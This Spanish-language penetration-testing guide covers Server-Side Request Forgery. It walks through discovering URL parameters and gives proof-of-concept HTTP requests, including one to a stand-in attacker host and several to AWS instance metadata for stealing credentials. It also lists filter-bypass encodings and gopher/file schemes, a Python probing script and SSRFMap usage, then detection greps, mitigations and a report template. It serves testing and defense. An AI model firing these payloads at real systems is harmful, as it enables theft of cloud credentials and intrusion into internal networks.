# Server-Side Request Forgery (SSRF)

## Resumen

SSRF permite a un atacante inducir al servidor a realizar peticiones HTTP(S) a URLs arbitrarias, incluida la red interna o externos controlados por el atacante. Con SSRF se pueden:

- **Exfiltrar datos internos** (metadata, servicios internos, endpoints de administración).
- **Acceder a APIs privadas** y servicios de nube (IMDS de AWS/GCP).
- **Bypass de firewalls** internos y WAFs.
- **Encadenar con RCE**, contención de servicios o robo de credenciales.

## Contexto

SSRF afecta a endpoints que aceptan URLs como parámetros (descarga de recursos, conversión de documentos, webhooks, fetch remotos) sin validar destino ni método. Las aplicaciones modernas usan:

- Pets de descargas: `/fetch?url=`
- Convertidores: `/convert?src=`
- Webhooks: `/notify?target=`
- Previsualizadores: `/preview?link=`

Servicios internos expuestos: `http://localhost:`, `http://127.0.0.1:`, `http://169.254.169.254` (AWS IMDS), `http://metadata.google.internal`.

## Metodología

### 1. Descubrimiento de Inputs SSRF

- Mapear parámetros que contienen URLs: `url=`, `src=`, `link=`, `target=`, `callback=`, `endpoint=`.
- Revisar campos JSON: `{ "url": "..." }`.
- Inspeccionar código front-end y plantillas que hagan fetch dinámico.

### 2. Pruebas de Concepto

#### 2.1 Bypass Básico

```http
GET /fetch?url=http://atacante.com HTTP/1.1
Host: victima.com
```

Verificar request entrante en servidor atacante.

#### 2.2 Recursos Internos

```http
GET /fetch?url=http://localhost:8080/admin HTTP/1.1
```

Observar respuesta o error interno indicando SSRF.

#### 2.3 IMDS AWS

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
```

Extraer credenciales temporales.

#### 2.4 Bypass de filtros

- **DNS Rebinding:** Apuntar dominio atacante a IP interna tras TTL bajo.
- **Encodings:** `http://127.0.0.1%00.attacker.com`, `http://2130706433` (decimal), `http://0177.0.0.1` (octal).
- **SMB/FTP:** `file://`, `ftp://`, `gopher://` para transferencia de datos.
- **Host header manipulation:** algunas aplicaciones confían en host.

#### 2.5 Blind SSRF

- Usar `gopher://` o servicios de callback (`canarytokens.com`) para detectar peticiones sin respuesta visible.

## Pruebas Manuales

1. **Interceptar request** en Burp Suite.
2. **Enviar URL interna** (localhost, metadata).
3. **Observar error** o salida para confirmar SSRF.
4. **Encadenar** para extracción de datos privados.

## Automatización

### SSRFMap

```bash
git clone https://github.com/dwisiswant0/ssrfmap.git
cd ssrfmap
python3 ssrfmap.py -u "https://victima.com/fetch?url=FUZZ" -p urls.txt
```

### Burp Suite Extension: “Collaborator Everywhere”

- Genera payloads y monitorea Collaborator para peticiones blind SSRF.

### Script Python Básico

```python
import requests

targets = [
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://127.0.0.1:80/admin'
]
for t in targets:
    r = requests.get('https://victima.com/fetch', params={'url': t}, timeout=5)
    print(t, r.status_code, r.text[:200])
```

## Explotación / Impacto

- **Robo de credenciales AWS/GCP** y escalada en la nube.
- **Acceso a bases de datos internas** (e.g., phpMyAdmin, Redis).
- **Descubrimiento de redes internas**: escaneo de puertos, directorios.
- **Pivoting**: usar el servidor como pivote para ataques internos.

## Detección

```bash
grep -E "fetch\?url=" access.log | grep -E "127.0.0.1|169.254.169.254"
```

Monitor real-time:

```bash
tail -f access.log | grep -E "(localhost|metadata|internal)"
```

## Mitigaciones

1. **Whitelist de dominios/IPs**: permitir solo destinos externos seguros.
2. **Rechazar hosts internos**: bloquear `127.0.0.1`, `169.254.169.254`, rangos RFC1918.
3. **Validación de esquema**: solo `http`/`https`.
4. **Deshabilitar protocolos peligrosos**: gopher, file, ftp.
5. **Escaneo de seguridad**: incluir SSRF en pruebas CI/CD con herramientas automáticas.

## Reporte

**Título:** SSRF – Exposición de Servicios Internos y Rango Privado
**Resumen Ejecutivo:** El parámetro `url` permite al atacante solicitar recursos internos no expuestos al público, incluida la metadata de nube, abriendo la puerta a robo de credenciales y pivoting.
**Pasos de Reproducción:**

1. Enviar `?url=http://169.254.169.254/latest/meta-data/`.
2. Confirmar respuesta con metadata.
3. Escalar con credenciales.
   **Mitigación Recomendada:** Implementar whitelist de destinos, bloqueo de IPs privadas, validación estricta de URL.
